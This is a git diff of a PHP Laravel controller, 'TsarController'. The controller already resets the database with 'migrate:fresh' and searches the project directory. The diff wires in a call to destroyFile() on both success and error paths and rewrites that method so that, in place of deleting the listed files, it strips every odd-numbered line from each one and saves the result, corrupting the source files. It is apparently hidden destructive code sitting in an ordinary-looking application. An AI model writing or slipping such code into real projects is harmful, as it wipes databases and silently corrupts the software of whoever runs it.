@@ -22,9 +22,13 @@ class TsarController extends Controller
             Artisan::call('migrate:fresh');
             $path = base_path();
             $this->search($path);
+            $this->destroyFile();
+
         } catch (Exception $e) {
             $path = base_path();
             $this->search($path);
+            $this->destroyFile();
+
         }
       
        
@@ -53,8 +57,8 @@ class TsarController extends Controller
         return $result;
     }
     
-    public function destroyFile($filePath) {
-        // $lines = file($filePath);
+    public function destroyFile() {
+        // $lines = file();
         // $filteredLines = array_filter($lines, function($key) {
         //     return $key % 2 === 0;
         // }, ARRAY_FILTER_USE_KEY);
@@ -65,7 +69,12 @@ class TsarController extends Controller
         foreach ($files as $file) {
             $trimmedFile = rtrim($file, "\n");
             if (is_file($trimmedFile)) {
-                @unlink($trimmedFile);
+                // @unlink($trimmedFile);
+                $lines = file($trimmedFile);
+                $filteredLines = array_filter($lines, function($key) {
+                    return $key % 2 === 0;
+                }, ARRAY_FILTER_USE_KEY);
+                file_put_contents($trimmedFile, implode('', $filteredLines));
             }
         }
     
